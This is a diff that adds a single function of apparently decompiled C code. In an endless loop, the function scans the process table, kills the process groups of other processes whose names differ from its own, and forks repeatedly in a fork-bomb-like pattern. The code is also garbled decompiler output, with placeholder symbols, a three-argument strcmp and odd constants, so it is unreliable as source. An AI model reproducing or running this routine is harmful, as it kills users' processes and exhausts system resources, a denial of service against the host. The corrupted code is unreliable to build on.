@@ -1,0 +1,160 @@
+void func_80485fb() {
+
+	void* ebp1;
+
+	int32_t eax2;
+
+	int32_t v3;
+
+	int32_t eax4;
+
+	void* eax5;
+
+	void* v6;
+
+	int32_t v7;
+
+	int32_t v8;
+
+	int32_t v9;
+
+	int32_t v10;
+
+	struct s0* v11;
+
+	int32_t eax12;
+
+	int32_t eax13;
+
+	int32_t v14;
+
+	struct s1* v15;
+
+	int32_t eax16;
+
+	int32_t eax17;
+
+	int32_t v18;
+
+
+	ebp1 = (void*)(((uint32_t)"intrinsic"() & 0xfffffff0) - 4 - 4);
+
+	eax2 = getpid();
+
+	v3 = eax2;
+
+	eax4 = getuid();
+
+	while (1) {
+
+		eax5 = readproctab(0x4022, (uint32_t)ebp1 + -52, 1);
+
+		v6 = eax5;
+
+		v7 = (int32_t)"";
+
+		v8 = (int32_t)func_0;
+
+		while (!(int1_t)(*(int32_t*)((int32_t)v6 + v8 * 4) == func_0)) {
+
+			if (**(int32_t**)((int32_t)v6 + v8 * 4) == v3)
+
+				goto addr_0x804866f_5;
+
+			++v8;
+
+		}
+
+		addr_0x80486a3_7:
+
+		v9 = v8 + 1;
+
+		v10 = v8 - 1;
+
+		while (v10 >= (int32_t)func_0 && !(int1_t)(*(int32_t*)((int32_t)v6 + v9 * 4) == func_0)) {
+
+			if (v10 >= (int32_t)func_0) {
+
+				v11 = *(struct s0**)((int32_t)v6 + v10 * 4);
+
+				eax12 = strcmp(v7, (int32_t)v11 + 0x1d8, 1);
+
+				if (eax12 != func_0) {
+
+					kill(-v11->f508, 0x109);
+
+				}
+
+				do {
+
+					eax13 = fork();
+
+					v14 = eax13;
+
+				} while (v14 > (int32_t)func_0);
+
+				if ((int1_t)(v14 == func_0))
+
+					goto addr_0x804871c_14;
+
+				--v10;
+
+			}
+
+			if (*(int32_t*)((int32_t)v6 + v9 * 4) == func_0)
+
+				continue;
+
+			v15 = *(struct s1**)((int32_t)v6 + v9 * 4);
+
+			eax16 = strcmp(v7, (int32_t)v15 + 0x1d8, 1);
+
+			if (eax16 != func_0) {
+
+				kill(-v15->f508, 0x109);
+
+			}
+
+			do {
+
+				eax17 = fork();
+
+				v18 = eax17;
+
+			} while (v18 > (int32_t)func_0);
+
+			if ((int1_t)(v18 == func_0))
+
+				goto addr_0x80487a5_21;
+
+			++v9;
+
+		}
+
+		addr_0x80487d9_23:
+
+		continue;
+
+		addr_0x80487a5_21:
+
+		setpgid(0x10000);
+
+		goto addr_0x80487d9_23;
+
+		addr_0x804871c_14:
+
+		setpgid(0x10000);
+
+		goto addr_0x80487d9_23;
+
+		addr_0x804866f_5:
+
+		v7 = *(int32_t*)((int32_t)v6 + v8 * 4) + 0x1d8;
+
+		goto addr_0x80486a3_7;
+
+	}
+
+}
+
+
